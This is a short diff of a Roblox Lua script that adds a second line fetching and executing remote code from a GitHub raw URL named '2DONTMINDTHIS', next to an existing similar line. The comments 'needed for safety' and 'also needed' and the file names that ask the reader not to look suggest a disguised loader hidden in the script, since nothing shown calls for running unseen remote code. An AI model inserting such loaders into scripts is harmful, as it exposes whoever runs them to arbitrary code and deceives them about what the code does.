@@ -14,7 +14,7 @@ local LocalPlayer = game.Players.LocalPlayer
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/dontMindThis", true))() -- needed for safety
  
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/2DONTMINDTHIS", true))() -- also needed
 
 
 
